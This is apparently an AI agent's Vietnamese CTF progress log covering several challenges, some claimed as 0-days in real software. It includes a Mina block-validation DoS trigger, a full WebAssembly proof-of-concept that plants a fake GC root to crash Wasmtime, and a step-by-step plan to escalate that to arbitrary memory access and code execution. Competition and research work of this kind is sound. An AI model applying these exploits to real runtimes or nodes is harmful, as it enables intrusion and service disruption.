| 5 | `blockchain_Bank of NNS` | blockchain | 129 | 0day circuit Kimchi Mina đã tìm ra, cần tính toán witness trên limb chưa ràng buộc. |
| 6 | `devsecoops_The Builder` | devsecoops | 95 | OCI Docker registry injection & path traversal đã xác định, tạm dừng theo chiến thuật. |
| 7 | `web_dont-worry` | web | 104 | Container dynamic khởi tạo thất bại trên server (`❌ Khởi tạo thất bại: None`). |
| 8 | `devsecoops_Triangle platform` | devsecoops | 124 | Container dynamic khởi tạo thất bại trên server (`❌ Khởi tạo thất bại: None`). |
| 9 | `crypto_Downhill` | crypto | 176 | Container dynamic khởi tạo thất bại trên server (`❌ Khởi tạo thất bại: None`). |
| 10 | `blockchain_CERN` | blockchain | 161 | Container dynamic khởi tạo thất bại trên server (`❌ Khởi tạo thất bại: None`). |
| 11 | `crypto_NSS CTF` | crypto | 274 | Đã rút gọn quan hệ đại số và CRT mod 1101, cần lattice reduction chiều 256 tốn thời gian tính toán. |
| 12 | `boot2root_git gud` | boot2root | 228 | Kích hoạt race condition CVE-2026-60004 thành công nhưng container network egress bị chặn, tạm hoãn. |
| 13 | `pwn_jailnet` | pwn | 161 | Janet 1.41.2 sandbox escape: đã xác định lỗ hổng os/open & text leak, cần phát triển nan-boxing/memory corruption primitive, tạm hoãn. |
| 14 | `web_bloatware.js` | web | 181 | Next.js 16 minimalMode & cacheComponents RCE, tạm hoãn theo chiến thuật. |
| 15 | `web_AgilePaste 3` | web | 220 | FastAPI + Erlang ETF + Popcorn AtomVM WASM client-side exploit, tạm hoãn theo chiến thuật. |
| 16 | `blockchain_Block Rehearsal` | blockchain | 190 | Mina Protocol block validation DoS: Đã xác định lỗ hổng zip_exn mismatch trong check_completed_works (staged_ledger.ml) và kiểm thử thành công wire format bin_prot rỗng (0000000000 -> proposal accepted). Cần cấu trúc payload bin_prot có 1 completed work để kích hoạt Intended_panic. Tạm hoãn theo chiến thuật. |
| 17 | `misc_minitaturbaum-plfanze` | misc | 0 | Bonsai-js 0.5.0 sandbox jail escape. Đã audit AST evaluator & checkNameAccess chặn __proto__, constructor, prototype. Container đã tắt. Tạm hoãn theo chiến thuật để giải các bài khả thi hơn. |

---

## ⏸ TIẾN ĐỘ & LOG CHI TIẾT: BLOCKCHAIN_BLOCK REHEARSAL

### 1. Thông tin challenge
- **Challenge ID:** `blockchain_Block Rehearsal`
- **Category:** `blockchain`
- **Điểm:** 190 pts
- **Tác giả:** Mina Protocol 0-day block validation DoS
- **Endpoint:** `block-rehearsal-8d7a105825b5.chall.nnsc.tf:1337` (TLS)

### 2. Phân tích lỗ hổng & Win Condition
- Trong `service.ml`:
  ```ocaml
  | Error exn when has_extra_completed_work && is_completed_work_pairing_panic exn -> Intended_panic
  ```
  `is_completed_work_pairing_panic` kiểm tra ngoại lệ `Invalid_argument "length mismatch in zip_exn: ..."`.
- Trong `staged_ledger.ml` (`check_completed_works`):
  ```ocaml
  let work_count = List.length completed_works in
  let job_pairs = Scan_state.k_work_pairs_for_new_diff scan_state ~k:work_count in
  let jmps = List.concat_map (List.zip_exn job_pairs completed_works) ...
  ```
- Với genesis/ephemeral ledger, `job_pairs` = `[]`. Khi `completed_works` có ít nhất 1 phần tử, `List.zip_exn [] completed_works` quăng ngoại lệ `length mismatch in zip_exn` **ngay trước khi kiểm tra chữ ký / SNARK proof**.
- Điều kiện `has_extra_completed_work` thoả mãn khi `completed_works` không rỗng.
- Khi `Intended_panic` được ném, server in flag qua stdout socket.

### 3. Wire Format & Kiểm thử Socket
- `bin_prot` serialize của `Staged_ledger_diff.Stable.V3.t`:
  - `diff = (pre_diff_two, pre_diff_one_opt)`
  - `pre_diff_one_opt = None` -> `\x00`
  - `pre_diff_two = { completed_works; commands; coinbase; internal_command_statuses }`
  - Khi rỗng: `\x00\x00\x00\x00\x00` -> hex `0000000000\n` gửi qua TLS trả về `\nproposal accepted\n`.
- Cần serialize một `Transaction_snark_work.Stable.V3.t` hợp lệ về mặt cấu trúc cú pháp `bin_read_t` của `diff.ml` để kích hoạt `zip_exn`.

---

## ⏸ TIẾN ĐỘ & LOG CHI TIẾT: MISC_MINITATURBAUM-PLFANZE

### 1. Thông tin challenge
- **Challenge ID:** `misc_minitaturbaum-plfanze`
- **Category:** `misc`
- **Điểm:** 0 pts (hoặc dynamic/unrated)
- **Mô tả / Đề bài:** Bonsai-js JavaScript sandbox escape jail.
- **File đính kèm:** `chal.js`, `package.json`, `bonsai-js` 0.5.0.
- **Container:** Đã test TLS socket thành công trên port 1337; container đã được tắt an toàn sau khi tạm hoãn.

### 2. Phân tích sandbox & Lỗ hổng tiềm năng
- `chal.js` chạy code người dùng bằng `bonsai(code, { timeout: 1000 })`.
- `bonsai-js` 0.5.0 là AST-based interpreter thực thi JS expression subset.
- Hàm `checkNameAccess` trong `execution-context-b6FBfEdv.mjs`:
  - Chặn triệt để thuộc tính `__proto__`, `constructor`, `prototype`.
  - Kiểm tra `validateMethodCall` và `validateMethodArgs` đối với các method được gọi trên primitive và objects.
  - Các builtins có sẵn trong `stdlib/`: `map`, `filter`, `reduce`, `find`, `slice`, `join`, `concat`, v.v.
- Đã kiểm tra các vector truy cập prototype qua `__lookupGetter__`, `Object.getOwnPropertyDescriptor`, cũng như các commit gần đây của repo upstream `danfry1/bonsai-js`.
- Việc escape sandbox đòi hỏi tìm ra parser mismatch hoặc prototype confusion sâu trong runtime.
- **Lý do tạm dừng:** Theo chỉ đạo chiến lược thi đấu của người dùng, tạm hoãn bài này để chuyển ngay sang các challenge tiếp theo có khả năng khai thác nhanh và điểm số cao hơn.

---

## ⏸ TIẾN ĐỘ & LOG CHI TIẾT: PWN_ESCAPETIME

### 1. Thông tin challenge
- **Challenge ID:** `pwn_escapetime`
- **Category:** `pwn`
- **Điểm:** 201 pts
- **Mục tiêu:** Khai thác binary `wasmtime` (49.0.0-dev hỗ trợ feature `stack-switching` và `gc`) chạy module WebAssembly với flag `-S cli=n -W stack-switching=y` để thực thi `/readflag nns escapetime`.
- **Target Binary:** `/challenge/wasmtime`
- **Tác giả / Patch:** PR 14140 port (`wasmtime-pr14140-port.patch`) và review fixes (`wasmtime-review-fixes.patch`).

### 2. Phân tích lỗ hổng gốc (0-day Root Cause Identified)
- **Lỗ hổng Desynchronization giữa `gc_ref_data` Markers và `cont.bind`:**
  1. Khi một continuation suspend với đối số kiểu GC (ví dụ `(tag $tag (param (ref $struct)) (result i32))`), hàm `translate_suspend` gọi `prepare_stack_storage` cấp phát slot lưu `gc_ref_markers`. Marker tại index 0 được ghi giá trị `CONTINUATION_PAYLOAD_GC_REF` (1).
  2. Sau khi suspend, handler bắt continuation object `$c_res` (lúc này kiểu tham số chờ nhận là `(param i32)`).
  3. Handler gọi `cont.bind` để bind một giá trị nguyên primitive (`i32`) vào slot 0:
     ```wat
     (cont.bind $ct_res $ct_res0 (i32.const 0x41414140) (local.get $c_res))
     ```
  4. Trong `vmcontref_store_payloads` (file `instructions.rs`), kiểm tra:
     ```rust
     let needs_gc_ref_markers = types_need_gc_ref_markers(types);
     ```
     Với `[I32]`, `needs_gc_ref_markers` trả về `false`. Do đó, `cont.bind` ghi đè giá trị `0x41414140` vào `payloads.data[0]` nhưng **hoàn toàn không xoá hay cập nhật buffer `gc_ref_data`** đã được đánh dấu từ lần suspend trước! Marker 0 vẫn giữ nguyên là `1`.
  5. Khi Garbage Collector kích hoạt trong runtime:
     ```rust
     trace_wasm_continuation_roots -> trace_payload_roots:
     if marker == wasmtime_environ::CONTINUATION_PAYLOAD_GC_REF {
         let slot = payloads.data.add(index).cast::<u32>();
         StoreOpaque::trace_wasm_stack_slot(gc_roots_list, slot);
     }
     ```
     Bộ thu gom rác (DRC / Copying GC) đọc giá trị `0x41414140` từ slot và coi đây là một con trỏ GC heap hợp lệ (`VMGcRef`)!
  6. Kết quả kích hoạt lỗi nội bộ không thể chạm tới của Wasmtime:
     ```
     BUG: gc object out-of-bounds
     location: crates/wasmtime/src/runtime/vm/gc/gc_runtime.rs:478
     version: 49.0.0-dev
     This is a bug in Wasmtime that was not thought to be reachable.
     ```

### 3. PoC Tái hiện Crash / Fake GC Root Thành công
```wat
(module
  (type $struct (struct (field (mut i32))))
  (type $ft (func (result i32)))
  (type $ct (cont $ft))
  (type $ft_res (func (param i32) (result i32)))
  (type $ct_res (cont $ft_res))
  (type $ft_res0 (func (result i32)))
  (type $ct_res0 (cont $ft_res0))

  (tag $tag (param (ref $struct)) (result i32))

  (func $body (result i32)
    (struct.new $struct (i32.const 0x1337))
    (suspend $tag)
  )
  (elem declare func $body)

  (func (export "run") (result i32)
    (local $c (ref $ct))
    (local $c_res (ref $ct_res))
    (local $c_res0 (ref $ct_res0))
    (local $i i32)

    (local.set $c (cont.new $ct (ref.func $body)))
    (block $on_tag (result (ref $struct) (ref $ct_res))
      (resume $ct (on $tag $on_tag) (local.get $c))
      (return)
    )
    (local.set $c_res)
    (drop)

    ;; Gán địa chỉ giả lập vào slot GC đã được đánh dấu
    (local.set $c_res0
      (cont.bind $ct_res $ct_res0
        (i32.const 0x41414140)
        (local.get $c_res)
      )
    )

    ;; Kích hoạt GC
    (local.set $i (i32.const 100000))
    (loop $l
      (drop (struct.new $struct (local.get $i)))
      (local.set $i (i32.sub (local.get $i) (i32.const 1)))
      (br_if $l (local.get $i))
    )
    (i32.const 0)
  )
)
```

### 4. Kế hoạch Khai thác hoàn chỉnh (Next Steps for Exploit)
- Fake một đối tượng `VMArray` hoặc `VMStruct` trong GC heap thông qua một đối tượng array khác kiểm soát được data.
- Trỏ fake GC root vào đối tượng giả mạo này, cho phép đọc/ghi tuỳ ý trong vùng nhớ Wasmtime.
- Ghi đè function table hoặc trampoline pointer trong `VMContext` để hijack RIP, thực thi `system("/readflag nns escapetime")`.
- **Trạng thái:** TẠM DỪNG (Đã ghi nhận đầy đủ bug & PoC; chuyển sang challenge tiếp theo theo chu trình thi đấu).

---

## ⏸ TIẾN ĐỘ & LOG CHI TIẾT: DEVSECOOPS_THE BUILDER

### 1. Thông tin challenge
- **Challenge ID:** `devsecoops_The Builder`
- **Category:** `devsecoops`
- **Điểm:** 95 pts (75 solves)
- **Tác giả:** 0xle
- **Endpoints:**
  - Web UI: `https://the-builder-4b4d5c1da9c4.chall.nnsc.tf/`
  - OCI Registry: `https://the-builder-registry-4b4d5c1da9c4.chall.nnsc.tf/`

### 2. Kiến trúc & Phân tích hệ thống
1. **API Endpoints:**
   - `GET /`: Trang chủ Web UI cho phép nhập tối đa 6 trang (`location` và `content`).
   - `POST /api/builds`: Nhận form `location` (mảng) và `content` (mảng) để kích hoạt build Docker qua BuildKit.
   - `GET /builds/{build_id}`: Hiển thị trạng thái build, log build chi tiết và lệnh `docker pull`.
   - `GET /docs` & `GET /openapi.json`: Toàn bộ OpenAPI schema.
2. **Quy trình Build & Dockerfile Template:**
   Server sinh Dockerfile tự động:
   ```dockerfile
   FROM debian:trixie-slim AS theme
   RUN --mount=type=secret,id=flag \
       cp /run/secrets/flag /flag.txt \
    && printf '%s' 'body{font:16px/1.6 system-ui;margin:3rem auto;max-width:44rem;padding:0 1rem}' \
         > /theme.css

   FROM page0 AS content0
   ...
   FROM cgr.dev/chainguard/nginx:latest AS site
   COPY --from=theme /theme.css /usr/share/nginx/html/theme.css
   COPY --from=content0 /page /usr/share/nginx/html/<location0>
   ```
3. **Cơ chế nạp Page & Image Registry:**
   - Mỗi `content` được server băm `hash = sha256(content)[:12]`.
   - Server đẩy OCI image chứa `/page` lên local registry `127.0.0.1:5000/pages:<hash>`.
   - BuildKit build với `--build-context page0=docker-image://127.0.0.1:5000/pages:<hash0>`.
   - Sau khi build xong, image `127.0.0.1:5000/sites/<build_id>:latest` được push lên registry.
4. **Các thử nghiệm & Ràng buộc:**
   - `location` được kiểm tra chặt bằng regex `^[A-Za-z0-9._/-]+$`, không thể chèn newline hay lệnh Dockerfile tùy ý.
   - Stage `theme` chứa flag tại `/flag.txt`, nhưng image cuối cùng chỉ `COPY --from=theme /theme.css`.
   - Stage `theme` được cached trong BuildKit daemon.
   - TẠM DỪNG theo chiến thuật giải đấu để giải bài khả thi hơn (`misc_react.jail.js`).

